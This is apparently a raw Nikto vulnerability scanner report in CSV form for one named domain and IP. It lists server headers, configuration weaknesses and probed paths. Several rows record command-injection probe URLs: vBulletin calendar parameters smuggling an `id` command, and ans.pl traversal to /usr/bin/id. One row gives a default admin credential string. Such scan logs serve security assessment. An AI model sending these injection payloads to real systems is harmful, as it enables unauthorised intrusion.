"Nikto - v2.1.5/2.1.5"
"sueldonetoautonomo.es","165.227.229.13","443","","","","Microsoft-IIS/8.5"
"sueldonetoautonomo.es","165.227.229.13","443","OSVDB-0","GET","/","Retrieved via header: kong/0.13.1"
"sueldonetoautonomo.es","165.227.229.13","443","OSVDB-0","GET","/","Retrieved x-powered-by header: ASP.NET 4.8"
"sueldonetoautonomo.es","165.227.229.13","443","OSVDB-0","GET","/","Server leaks inodes via ETags, header found with file /, fields: 0xW/5ac13fdb 0x6fee "
"sueldonetoautonomo.es","165.227.229.13","443","OSVDB-0","GET","/","The anti-clickjacking X-Frame-Options header is not present."
"sueldonetoautonomo.es","165.227.229.13","443","OSVDB-0","GET","/","Uncommon header 'x-kong-proxy-latency' found, with contents: 0"
"sueldonetoautonomo.es","165.227.229.13","443","OSVDB-0","GET","/","Uncommon header 'x-kong-upstream-latency' found, with contents: 6"
"sueldonetoautonomo.es","165.227.229.13","443","OSVDB-0","GET","/","Hostname 'sueldonetoautonomo.es' does not match certificate's CN 'TRAEFIK'"
"sueldonetoautonomo.es","165.227.229.13","443","OSVDB-0","GET","/","Uncommon header 'x-content-type-options' found, with contents: nosniff"
"sueldonetoautonomo.es","165.227.229.13","443","OSVDB-3092","GET","/css","/css: This might be interesting..."
"sueldonetoautonomo.es","165.227.229.13","443","OSVDB-3092","GET","/img/","/img/: This might be interesting..."
"sueldonetoautonomo.es","165.227.229.13","443","OSVDB-3092","GET","/js","/js: This might be interesting..."
"sueldonetoautonomo.es","165.227.229.13","443","OSVDB-3299","GET","/forumscalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22","/forumscalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html"
"sueldonetoautonomo.es","165.227.229.13","443","OSVDB-3299","GET","/forumzcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22","/forumzcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html"
"sueldonetoautonomo.es","165.227.229.13","443","OSVDB-3299","GET","/htforumcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22","/htforumcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html"
"sueldonetoautonomo.es","165.227.229.13","443","OSVDB-3299","GET","/vbcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22","/vbcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html"
"sueldonetoautonomo.es","165.227.229.13","443","OSVDB-3299","GET","/vbulletincalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22","/vbulletincalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html"
"sueldonetoautonomo.es","165.227.229.13","443","OSVDB-724","GET","/ans.pl?p=../../../../../usr/bin/id|&blah","/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.  http://ans.gq.nu/ default admin string 'admin:aaLR8vE.jjhss:root@127.0.0.1', password file location 'ans_data/ans.passwd'"
"sueldonetoautonomo.es","165.227.229.13","443","OSVDB-724","GET","/ans/ans.pl?p=../../../../../usr/bin/id|&blah","/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely."
